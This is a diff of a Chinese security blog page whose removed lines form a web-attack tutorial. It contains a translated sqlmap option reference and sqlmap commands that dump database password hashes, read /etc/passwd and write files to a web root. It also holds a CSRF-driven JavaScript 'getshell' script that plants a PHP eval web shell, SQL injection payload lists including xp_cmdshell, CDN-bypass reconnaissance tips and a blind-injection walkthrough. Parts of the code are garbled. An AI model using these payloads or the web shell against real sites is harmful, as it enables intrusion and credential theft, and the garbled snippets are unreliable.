HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</span><br><span class="line">--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）</span><br><span class="line">--auth-cert=ACERT HTTP认证证书（key_file，cert_file）</span><br><span class="line">--proxy=PROXY 使用HTTP代理连接到目标URL</span><br><span class="line">--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）</span><br><span class="line">--ignore-proxy 忽略系统默认的HTTP代理</span><br><span class="line">--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒</span><br><span class="line">--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）</span><br><span class="line">--retries=RETRIES 连接超时后重新连接的时间（默认3）</span><br><span class="line">--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</span><br><span class="line">--safe-url=SAFURL 在测试过程中经常访问的url地址</span><br><span class="line">--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Enumeration（枚举）：</p>
-<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-b, –banner 检索数据库管理系统的标识</span><br><span class="line">--current-user 检索数据库管理系统当前用户</span><br><span class="line">--current-db 检索数据库管理系统当前数据库</span><br><span class="line">--is-dba 检测DBMS当前用户是否DBA</span><br><span class="line">--users 枚举数据库管理系统用户</span><br><span class="line">--passwords 枚举数据库管理系统用户密码哈希</span><br><span class="line">--privileges 枚举数据库管理系统用户的权限</span><br><span class="line">--roles 枚举数据库管理系统用户的角色</span><br><span class="line">--dbs 枚举数据库管理系统数据库</span><br><span class="line">-D DBname 要进行枚举的指定数据库名</span><br><span class="line">-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</span><br><span class="line">--tables 枚举的DBMS数据库中的表</span><br><span class="line">--columns 枚举DBMS数据库表列</span><br><span class="line">--dump 转储数据库管理系统的数据库中的表项</span><br><span class="line">--dump-all 转储所有的DBMS数据库表中的条目</span><br><span class="line">--search 搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br><span class="line">--exclude-sysdbs 枚举表时排除系统数据库</span><br><span class="line">--start=LIMITSTART 第一个查询输出进入检索</span><br><span class="line">--stop=LIMITSTOP 最后查询的输出进入检索</span><br><span class="line">--first=FIRSTCHAR 第一个查询输出字的字符检索</span><br><span class="line">--last=LASTCHAR 最后查询的输出字字符检索</span><br><span class="line">--sql-query=QUERY 要执行的SQL语句</span><br><span class="line">--sql-shell 提示交互式SQL的shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Optimization（优化）：</p>
-<p>这些选项可用于优化SqlMap的性能。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--o 开启所有优化开关</span><br><span class="line">--predict-output 预测常见的查询输出</span><br><span class="line">--keep-alive 使用持久的HTTP（S）连接</span><br><span class="line">--null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line">--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Injection（注入）：</p>
-<p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--p TESTPARAMETER 可测试的参数（S）</span><br><span class="line">--dbms=DBMS 强制后端的DBMS为此值</span><br><span class="line">--os=OS 强制后端的DBMS操作系统为这个值</span><br><span class="line">--prefix=PREFIX 注入payload字符串前缀</span><br><span class="line">--suffix=SUFFIX 注入payload字符串后缀</span><br><span class="line">--tamper=TAMPER 使用给定的脚本（S）篡改注入数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Detection（检测）：</p>
-<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL 执行测试的等级（1-5，默认为1）</span><br><span class="line">--risk=RISK 执行测试的风险（0-3，默认为1）</span><br><span class="line">--string=STRING 查询时有效时在页面匹配字符串</span><br><span class="line">--regexp=REGEXP 查询时有效时在页面匹配正则表达式</span><br><span class="line">--text-only 仅基于在文本内容比较网页</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Techniques（技巧）：</p>
-<p>这些选项可用于调整具体的SQL注入测试。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH SQL注入技术测试（默认BEUST）</span><br><span class="line">--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br><span class="line">--union-cols=UCOLS 定列范围用于测试UNION查询注入</span><br><span class="line">--union-char=UCHAR 用于暴力猜解列数的字符</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Fingerprint（指纹）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f, –fingerprint 执行检查广泛的DBMS版本指纹</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>Brute force（蛮力）：</p>
-<p>这些选项可以被用来运行蛮力检查。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--common-tables 检查存在共同表</span><br><span class="line">--common-columns 检查存在共同列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>User-defined function injection（用户自定义函数注入）：</p>
-<p>这些选项可以用来创建用户自定义函数。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--udf-inject 注入用户自定义函数</span><br><span class="line">--shared-lib=SHLIB 共享库的本地路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>File system access（访问文件系统）：</p>
-<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--file-read=RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line">--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Operating system access（操作系统访问）：</p>
-<p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=OSCMD 执行操作系统命令</span><br><span class="line">--os-shell 交互式的操作系统的shell</span><br><span class="line">--os-pwn 获取一个OOB shell，meterpreter或VNC</span><br><span class="line">--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line">--os-bof 存储过程缓冲区溢出利用</span><br><span class="line">--priv-esc 数据库进程用户权限提升</span><br><span class="line">--msf-path=MSFPATH Metasploit Framework本地的安装路径</span><br><span class="line">--tmp-path=TMPPATH 远程临时文件目录的绝对路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>Windows注册表访问：</p>
-<p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">--reg-read 读一个Windows注册表项值</span><br><span class="line">--reg-add 写一个Windows注册表项值数据</span><br><span class="line">--reg-del 删除Windows注册表键值</span><br><span class="line">--reg-key=REGKEY Windows注册表键</span><br><span class="line">--reg-value=REGVAL Windows注册表项值</span><br><span class="line">--reg-data=REGDATA Windows注册表键值数据</span><br><span class="line">- -reg-type=REGTYPE Windows注册表项值类型</span><br><span class="line">这些选项可以用来设置一些一般的工作参数。</span><br><span class="line">--t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</span><br><span class="line">--s SESSIONFILE 保存和恢复检索会话文件的所有数据</span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line">--fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line">--eta 显示每个输出的预计到达时间</span><br><span class="line">--update 更新SqlMap</span><br><span class="line">--save file保存选项到INI配置文件</span><br><span class="line">--batch 从不询问用户输入，使用所有默认配置</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>Miscellaneous（杂项）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--beep 发现SQL注入时提醒</span><br><span class="line">--check-payload IDS对注入payloads的检测测试</span><br><span class="line">--cleanup SqlMap具体的UDF和表清理DBMS</span><br><span class="line">--forms 对目标URL的解析和测试形式</span><br><span class="line">--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果</span><br><span class="line">--page-rank Google dork结果显示网页排名（PR）</span><br><span class="line">--parse-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line">--replicate 复制转储的数据到一个sqlite3数据库</span><br><span class="line">--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</span><br><span class="line">--wizard 给初级用户的简单向导界面</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
+<h4 id="3-根据猜解的表进行猜解表的字段-假如通过2得到了admin这个表"><a href="#3-根据猜解的表进行猜解表的字段-假如通过2得到了admin这个表" class="headerlink" title="(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)"></a>(3) 根据猜解的表进行猜解表的字段(假如通过2得到了<code>admin</code>这个表)</h4>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/04/22/sqlmap/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1231,262 +644,14 @@
 <li>改用只接受post数据   、</li>
 <li>在提交表单进行hash 加密 在服务端进行hash验证 （如果用户Cookie没有被盗取）</li>
 </ul>
-<p>一个getshell的js脚本 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function getshell</span><br><span class="line">&#123;</span><br><span class="line">	//创建文件名为muma,php的文件</span><br><span class="line">var xmlhttp1=new XMLHttpRequest()</span><br><span class="line">xmlhttpl.open(&quot;post&quot;,&quot;./templaTe.php?m=createfile&quot;,true)</span><br><span class="line">xmlhttpl.setrequesthEader(&quot;content-type&quot;,&quot;applIcation/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp1.send(&quot;filename=muma.php</span><br><span class="line">	//在muma.php文件中写入一句话</span><br><span class="line">var xmlhttp2=new XMLHttpReqest();</span><br><span class="line">xmlhttp2.open(&quot;post&quot;,&quot;./template.php?m=save_edit,true);</span><br><span class="line">xmlhttp2.setrequesthEader(&quot;content-type&quot;, plication/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp2.send(&quot;filename=muma.php&amp;content=%3C%Fphp+eval%28%24_POST_%5B%27cmd%27%5D%29%3B%3f%3e&quot;);</span><br><span class="line">getshell();</span><br></pre></td></tr></table></figure>
-
-<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><p>-u #注入点</p>
-<p>-f #指纹判别数据库类型</p>
-<p>-b #获取数据库版本信息</p>
-<p>-p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)</p>
-<p>-D “” #指定数据库名</p>
-<p>-T “” #指定表名</p>
-<p>-C “” #指定字段</p>
-<p>-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)</p>
-<p>–columns #列出字段</p>
-<p>–current-user #获取当前用户名称</p>
-<p>–current-db #获取当前数据库名称</p>
-<p>–users #列数据库所有用户</p>
-<p>–passwords #数据库用户所有密码</p>
-<p>–privileges #查看用户权限(–privileges -U root)</p>
-<p>-U #指定数据库用户</p>
-<p>–dbs #列出所有数据库</p>
-<p>–tables -D “” #列出指定数据库中的表</p>
-<p><strong>-v #<strong><strong>详细的等级</strong></strong>(0-6)</strong></p>
-<p>0：只显示Python的回溯，错误和关键消息。</p>
-<p>1：显示信息和警告消息。</p>
-<p>2：显示调试消息。</p>
-<p>3：有效载荷注入。</p>
-<p>4：显示HTTP请求。</p>
-<p>5：显示HTTP响应头。</p>
-<p>6：显示HTTP响应页面的内容 </p>
-<p>1.读取数据库版本，当前用户，当前数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 -f -b –current-user –current-db -v 1</span><br></pre></td></tr></table></figure>
-
-<p>2.判断当前数据库用户权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –privileges -U 用户名 -v 1</span><br><span class="line"></span><br><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –is-dba -U 用户名 -v 1</span><br></pre></td></tr></table></figure>
-
-<p>3.读取所有数据库用户或指定数据库用户的密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-users –-passwords -v 2</span><br><span class="line"></span><br><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-passwords -U root -v 2</span><br></pre></td></tr></table></figure>
-
-<p>4.获取所有数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-dbs -v 2</span><br></pre></td></tr></table></figure>
-
-<p>5.获取指定数据库中的所有表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-tables -D mysql -v 2</span><br></pre></td></tr></table></figure>
-
-<p>6.获取指定数据库名中指定表的字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-columns -D mysql -T users -v 2</span><br></pre></td></tr></table></figure>
-
-<p>7.获取指定数据库名中指定表中指定字段的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2</span><br></pre></td></tr></table></figure>
-
-<p>8.file-read读取web文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-file-read “/etc/passwd” -v 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>9.file-write写入文件到web</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>被动信息搜集</p>
-<h1 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h1><p>收集其子域名：常用工具和方法，</p>
-<p>子域名扫描工具，如：layer、kali下的fierce（首先<em>尝试域传送漏洞</em>，如果不成功再尝试暴力破解）</p>
-<p>1、爬虫爬取页面源代码中的子域名 如：burp 带的Spider等。</p>
-<p>2、在线子域名查询网站、 <a target="_blank" rel="noopener" href="https://www.t00ls.net/ip.html">T00ls</a>、站长之家，<a target="_blank" rel="noopener" href="http://i.links.cn/subdomain/">等</a></p>
-<p>3、<a target="_blank" rel="noopener" href="https://crt.sh/">HTTPS</a> 证书搜集、ip反查、</p>
-<p>​                                                      </p>
-<h1 id="查找其真实ip"><a href="#查找其真实ip" class="headerlink" title="查找其真实ip"></a>查找其真实ip</h1><p><strong>验证是否存在****CDN</strong> </p>
-<p>·        nslookup url ，存在的或返回多个ip相反返回一个ip</p>
-<p>·        多地ping</p>
-<p><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
-<p><a target="_blank" rel="noopener" href="http://ping.aizhan.com/">http://ping.aizhan.com/</a> <a target="_blank" rel="noopener" href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
-<p>·        使用各种其他工具 ，直接查询是否使用了CDN</p>
-<p><a target="_blank" rel="noopener" href="http://www.cdnplanet.com/tools/cdnfinder/">http://www.cdnplanet.com/tools/cdnfinder/</a> <a target="_blank" rel="noopener" href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a></p>
-<p><strong>绕过****CDN</strong></p>
-<p>·        查看域名和ip绑定的历史 可能存在CDN 的记录 相关网站</p>
-<p><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> <a target="_blank" rel="noopener" href="http://toolbar.netcraft.com/site_report?url">http://toolbar.netcraft.com/site_report?url</a>= <a target="_blank" rel="noopener" href="http://viewdns.info/">http://viewdns.info/</a></p>
-<p>·        查询子域名 毕竟 很多小站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP</p>
-<p>·        利用</p>
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><p>MSSQL</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">http://www.mytest.com/showdetail.asp?id=49 ;and (select count(*) from sysobjects)&gt;0  页面正常</span><br><span class="line">http://www.mytest.com/showdetail.asp?id=49 ;and (select count(*) from msysobjects)&gt;0  异常，作为开启IIS错误提示时的验证</span><br><span class="line">`/*`是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下	查询字符：</span><br><span class="line">ID=1 and length(user)&gt;0</span><br><span class="line">id=2 and version()&gt;1 出现异常</span><br><span class="line">1 or 1=1</span><br><span class="line">&quot; or &quot;1&quot;=&quot;1</span><br><span class="line">1&#x27; or 1=1 --</span><br><span class="line">1&quot; or 1=1 --</span><br><span class="line">and 0</span><br><span class="line">and 1</span><br><span class="line">1&#x27; || &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;; exec master..xp_cmdshell &#x27;ping 10.10.1.2&#x27;--</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; union (select @@version) --</span><br><span class="line">&#x27; union (select NULL, (select @@version)) --</span><br><span class="line">&#x27; union (select NULL, NULL, (select @@version)) --</span><br><span class="line">&#x27; union (select NULL, NULL, NULL,  (select @@version)) --</span><br><span class="line">&#x27; union (select NULL, NULL, NULL, NULL,  (select @@version)) --</span><br><span class="line">&#x27; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --</span><br><span class="line">如果错误提示没有关闭，会报出用户名，如果是sa账号的话，会提示‘dbo’</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>数据库类型判断，一般asp 的网站大部分是Access或者 SQL server，</p>
-<p>Access</p>
-<p>判断方法和SqlServer前两个用法一样，不同的是页面都会异常</p>
-<p>oracle</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ID=1 and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11</span><br><span class="line">ID=1 and 0&lt;&gt;(selectcount(*)fromdual)</span><br><span class="line">ID=1CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>--</code>是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：</li>
-<li><code>;</code>是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</li>
-<li><code>--</code>是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一</li>
-<li>在注入点后加（必须为注入点）;–（一个分号，两个横线），例如：<a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://xxxx/article/as.asp?id=1;--">http://xxxx/article/as.asp?id=1;–</a>。如果返回正常的话，说明数据库是MSSQL，在MSSQL数据库中;和–都是存在的，;用来分离两个语句，而–就是注释符，它后面语句都不执行。如果返回错误，基本可以肯定是ACCESS数据库了。</li>
-</ul>
-<p>mysql</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id=2 and version()&gt;0返回正常 </span><br><span class="line">id=2 and version()&gt;1 返回与@@version&gt;1 相同页面时</span><br><span class="line">id=2 and len(user())&gt;0</span><br><span class="line">id=2CHAR(97,110,100,32,49,61,49)</span><br><span class="line">1 or 1=1</span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&quot; or &quot;1&quot;=&quot;1</span><br><span class="line">1&#x27; or 1=1 --</span><br><span class="line">1&quot; or 1=1 --</span><br><span class="line">and 0</span><br><span class="line">and 1</span><br><span class="line">1&#x27; || &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="基于bool的盲注"><a href="#基于bool的盲注" class="headerlink" title="基于bool的盲注"></a>基于bool的盲注</h2><p>注入方法都需要网页可以显示查询数据的结果，而盲注适合页面不显示任何数据查询结果</p>
-<ol>
-<li><p>这里普及一下盲注时的常用函数<br>mid()函数</p>
-<p>mid(striing,start,length)</p>
-<p>string(必需)规定要返回其中一部分的字符串。</p>
-<p>start(必需)规定开始位置（起始值是 1）。</p>
-<p>length(可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select mid((&#x27;asdf&#x27;)from(2))   //输出sdf</span><br><span class="line">select mid((&#x27;asdf&#x27;)from(2)for(1)) //输出 s</span><br><span class="line">select mid((&#x27;asdf&#x27;)from(2)FOR(2) )//输出 sd</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-<li><p>substr()函数 </p>
-<p>SUBSTR(str FROM pos FOR len)</p>
-<p>str(必需)规定要返回其中一部分的字符串。</p>
-<p>pos(必需)规定在字符串的何处开始。</p>
-<p>len(可选)规定被返回字符串的长度。不选就输出  其后的所有</p>
-</li>
-<li><p>left()函数</p>
-<p>left(string,length)</p>
-<p>再怎么解释也不如直接开弄</p>
-<p>string(必需)规定要返回其中一部分的字符串</p>
-<p>length（可选）规定被返回字符串的前length长度的字符</p>
-<p>ascii(a)将a转换成其ASCII值 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left (database(),1)=2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="1554043896144.png" alt="1554043896144"></p>
-</li>
-</ol>
-<p>猜解数据库长度，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and length(database())&gt;2 %23  以次改变 显示正常时正确</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="1554016830002.png" alt="1554016830002"></p>
-<p>猜解数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and substr(database())&gt;&#x27;r&#x27; %23 同理判断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="1554017028611.png" alt="1554017028611"></p>
-<p>继续猜解第二个字符</p>
-<p>由此可推断第一个字符是s<br>接下来判断第二个字符：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and left(database(),2)&gt;’sd’%23</p>
-<p>‘sd’&lt;’当前数据库名的前两位字符’&lt;’sf’       所以当前数据库名的第二位字符为’e’。以此类推，最后得到当前数据库名为“security”</p>
-<p>猜解表名</p>
-<p>先猜解表名长度</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1))&lt;5 %23  </span><br><span class="line">先判断范围 再用等号判断值  返回正确为止 </span><br><span class="line">实际执行</span><br><span class="line">select length((select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="1554025935234.png" alt="1554025935234"></p>
-<p>确定表明</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and  ascii( mid((select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)from(2)for(1)) ) %23  这里进行assii 进行比较 逐个猜解</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>查询表的数量</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;  and (select count(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27; )&gt;1 %23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="1554040600900.png" alt="1554040600900"></p>
